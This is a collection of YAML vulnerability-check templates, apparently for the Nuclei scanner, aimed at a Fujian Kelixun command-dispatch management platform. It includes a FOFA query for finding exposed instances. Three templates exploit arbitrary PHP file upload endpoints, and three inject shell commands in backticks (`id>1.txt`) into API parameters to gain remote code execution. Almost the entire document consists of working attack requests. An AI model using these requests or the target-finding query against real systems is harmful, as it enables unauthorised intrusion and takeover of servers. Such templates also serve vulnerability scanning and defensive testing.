## 福建科立讯通信有限公司指挥调度管理平台RCE

## fofa
```
指挥调度管理平台
```

## event_uploadfile接口任意上传.yaml
```
id: event-uploadfile
info:
  name: 福建科立讯通信有限公司指挥调度管理平台RCE_event-uploadfile接口任意上传
  author: wayxz
  severity: high

http:
  - raw:
      - |
        POST /api/client/event/uploadfile.php HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary25qW4eG1Jt50iyf7
        Content-Length: 372

        ------WebKitFormBoundary25qW4eG1Jt50iyf7
        Content-Disposition: form-data; name="uuid"

          1
        ------WebKitFormBoundary25qW4eG1Jt50iyf7
        Content-Disposition: form-data; name="number"

          1
        ------WebKitFormBoundary25qW4eG1Jt50iyf7
        Content-Disposition: form-data; name="uploadfile";filename="1.php"
        Content-Type: image/png

          111
        ------WebKitFormBoundary25qW4eG1Jt50iyf7--

      - |
        GET /upload/task/{{timestrp}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)

    extractors:
     - type: regex
       name: timestrp
       internal: true
       part: body
       regex:
          - '[0-9a-zA-Z]{8}-[0-9a-zA-Z]{4}-[0-9a-zA-Z]{4}-[0-9a-zA-Z]{4}-[0-9a-zA-Z]{12}.php'  
        
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "111"
      - type: status
        status:
          - 200
```
## invite2videoconf接口RCE.yaml
```
id: invite2videoconf_rce
info:
  name: 福建科立讯通信有限公司指挥调度管理平台RCE
  author: wayxz
  severity: high

http:
  - raw:
      - |
        GET /api/client/invite2videoconf.php?callee=1&roomid=`id>1.txt` HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)

      - |
        GET  /api/client/1.txt HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)

        

    matchers:
      - type: dsl
        dsl:
          - 'contains(body_2,"id")'

```

## invite_one_member接口RCE.yaml
```
id: invite_one_member_rce
info:
  name: 福建科立讯通信有限公司指挥调度管理平台RCE
  author: wayxz
  severity: high

http:
  - raw:
      - |
        GET /api/client/audiobroadcast/invite_one_member.php?callee=1&roomid=`id>1.txt` HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)

      - |
        GET /api/client/audiobroadcast/1.txt HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)

        

    matchers:
      - type: dsl
        dsl:
          - 'contains(body_2,"uid")'

```
## invite_one_ptter接口RCE.yaml
```
id: invite_one_ptter_rce
info:
  name: 福建科立讯通信有限公司指挥调度管理平台RCE
  author: wayxz
  severity: high

http:
  - raw:
      - |
        GET /api/client/ptt/invite_one_ptter.php?callee=all&caller=1&pttnumber=`id>1.txt`&force=1&timeout=1 HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)

      - |
        GET  /api/client/ptt/1.txt HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)

        

    matchers:
      - type: dsl
        dsl:
          - 'contains(body_2,"id")'

```
## task-upload接口任意上传.yaml
```
id: task-upload-rce
info:
  name: 福建科立讯通信有限公司指挥调度管理平台RCE_task-upload接口任意上传
  author: wayxz
  severity: high

http:
  - raw:
      - |
        POST /api/client/task/uploadfile.php HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
        Connection: close
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary25qW4eG1Jt50iyf7
        Cookie: PHPSESSID=403fc14298f14704c52657fc5ff62c71
        Content-Length: 374

        ------WebKitFormBoundary25qW4eG1Jt50iyf7
        Content-Disposition: form-data; name="uuid"

            1
        ------WebKitFormBoundary25qW4eG1Jt50iyf7
        Content-Disposition: form-data; name="number"

            122
        ------WebKitFormBoundary25qW4eG1Jt50iyf7
        Content-Disposition: form-data; name="uploadfile";filename="1.php"
        Content-Type: image/jpg

            111
        ------WebKitFormBoundary25qW4eG1Jt50iyf7--

      - |
        GET /upload/task/{{timestrp}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)

    extractors:
     - type: regex
       name: timestrp
       internal: true
       part: body
       regex:
         - '[0-9a-zA-Z]{8}-[0-9a-zA-Z]{4}-[0-9a-zA-Z]{4}-[0-9a-zA-Z]{4}-[0-9a-zA-Z]{12}.php'  
        
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '111'
      - type: status
        status:
          - 200

```
## upload接口任意上传.yaml
```
id: uploadFile_rce
info:
  name: 福建科立讯通信有限公司指挥调度管理平台RCE
  author: wayxz
  severity: high

http:
  - raw:
      - |
        POST /api/client/upload.php HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
        Content-Length: 180
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySwvD8hSn3Z0sHfMu
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

        ------WebKitFormBoundarySwvD8hSn3Z0sHfMu
        Content-Disposition: form-data; name="ulfile";filename="1.php"
        Content-Type: image/png

        111
        ------WebKitFormBoundarySwvD8hSn3Z0sHfMu--

      - |
        GET  /upload/1.php HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)

        
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '111'
      - type: status
        status:
          - 200

```
